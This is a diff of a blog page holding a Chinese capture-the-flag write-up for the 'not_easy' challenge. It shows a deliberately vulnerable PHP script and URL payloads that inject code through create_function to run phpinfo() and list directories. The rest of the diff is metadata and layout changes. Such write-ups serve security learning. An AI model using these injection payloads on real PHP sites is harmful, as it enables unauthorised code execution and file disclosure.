@@ -123,13 +123,13 @@
 
 
 
-<meta name="description" content="not_easy123456789101112131415&amp;lt;?phperror_reporting(0);if(isset($_GET[&apos;action&apos;])) &amp;#123;    $action = $_GET[&apos;action&apos;];&amp;#125;if(isset($_GET[&apos;action&apos;]))&amp;#123;    $arg = $_GET[&apos;arg&apos;];&amp;#125;if(preg_match">
+<meta name="description" content="not_easy123456789101112131415&amp;lt;?phperror_reporting(0);if(isset($_GET[&apos;action&apos;])) &amp;#123;    $action = $_GET[&apos;action&apos;];&amp;#125;if(isset($_GET[&apos;action&apos;]))&amp;#123;    $arg = $_GET[&apos;arg&apos;];&amp;#125;if(preg_matc">
 <meta name="keywords" content="CTF">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2019年掘安杯writeup">
 <meta property="og:url" content="https://style-404.github.io/2019/04/08/2019年掘安杯writeup/index.html">
 <meta property="og:site_name" content="可乐&#39;blog">
-<meta property="og:description" content="not_easy123456789101112131415&amp;lt;?phperror_reporting(0);if(isset($_GET[&apos;action&apos;])) &amp;#123;    $action = $_GET[&apos;action&apos;];&amp;#125;if(isset($_GET[&apos;action&apos;]))&amp;#123;    $arg = $_GET[&apos;arg&apos;];&amp;#125;if(preg_match">
+<meta property="og:description" content="not_easy123456789101112131415&amp;lt;?phperror_reporting(0);if(isset($_GET[&apos;action&apos;])) &amp;#123;    $action = $_GET[&apos;action&apos;];&amp;#125;if(isset($_GET[&apos;action&apos;]))&amp;#123;    $arg = $_GET[&apos;arg&apos;];&amp;#125;if(preg_matc">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vguehe0fj30us0chwgc.jpg">
 <meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vgxu71q7j30xc0e8go2.jpg">
@@ -153,10 +153,10 @@
 <meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1wbl3nu9aj30i703tq35.jpg">
 <meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1wbv9l62wj30vb0eymzk.jpg">
 <meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1wc5ixr3pj310y0e876l.jpg">
-<meta property="og:updated_time" content="2019-04-09T05:56:55.503Z">
+<meta property="og:updated_time" content="2019-05-17T07:20:14.555Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="2019年掘安杯writeup">
-<meta name="twitter:description" content="not_easy123456789101112131415&amp;lt;?phperror_reporting(0);if(isset($_GET[&apos;action&apos;])) &amp;#123;    $action = $_GET[&apos;action&apos;];&amp;#125;if(isset($_GET[&apos;action&apos;]))&amp;#123;    $arg = $_GET[&apos;arg&apos;];&amp;#125;if(preg_match">
+<meta name="twitter:description" content="not_easy123456789101112131415&amp;lt;?phperror_reporting(0);if(isset($_GET[&apos;action&apos;])) &amp;#123;    $action = $_GET[&apos;action&apos;];&amp;#125;if(isset($_GET[&apos;action&apos;]))&amp;#123;    $arg = $_GET[&apos;arg&apos;];&amp;#125;if(preg_matc">
 <meta name="twitter:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vguehe0fj30us0chwgc.jpg">
 
 
@@ -407,7 +407,8 @@
       
 
       
-        <h1 id="not-easy"><a href="#not-easy" class="headerlink" title="not_easy"></a>not_easy</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>])) &#123;</span></span><br><span class="line"><span class="php">    $action = $_GET[<span class="string">'action'</span>];</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]))&#123;</span></span><br><span class="line"><span class="php">    $arg = $_GET[<span class="string">'arg'</span>];</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action))&#123;</span></span><br><span class="line"><span class="php">    show_source(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    $action($arg,<span class="string">''</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
+        <p><meta name="referrer" content="no-referrer"></p>
+<h1 id="not-easy"><a href="#not-easy" class="headerlink" title="not_easy"></a>not_easy</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>])) &#123;</span></span><br><span class="line"><span class="php">    $action = $_GET[<span class="string">'action'</span>];</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]))&#123;</span></span><br><span class="line"><span class="php">    $arg = $_GET[<span class="string">'arg'</span>];</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action))&#123;</span></span><br><span class="line"><span class="php">    show_source(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    $action($arg,<span class="string">''</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
 <p>这是P神代码审计的题目，但是被改动了参数的位置<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vguehe0fj30us0chwgc.jpg" alt=""><br>create_function注入分析：</p>
 <p><a href="https://style-404.github.io/2019/03/24/p%E7%A5%9E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%9F%A5%E8%AF%86%E6%98%9F%E7%90%83%E4%BA%8C%E5%91%A8%E5%B9%B4wp/">https://style-404.github.io/2019/03/24/p%E7%A5%9E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%9F%A5%E8%AF%86%E6%98%9F%E7%90%83%E4%BA%8C%E5%91%A8%E5%B9%B4wp/</a><br>在这道题中，可控的是第二个参数 通过加上 ‘)’ 闭合来进行注入<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">action</span>=%5ccreate_function&amp;arg=)&#123;&#125;phpinfo();/*</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vgxu71q7j30xc0e8go2.jpg" alt=""><br>接下只需改变phpinfo();代码进行注入即可<br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=<span class="meta">%5ccreate_function</span>&amp;arg=)&#123;&#125;print_r(scandir(<span class="string">'../'</span>));/*</span><br></pre></td></tr></table></figure></p>
@@ -591,7 +592,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">47</span>
+                  <span class="site-state-item-count">48</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
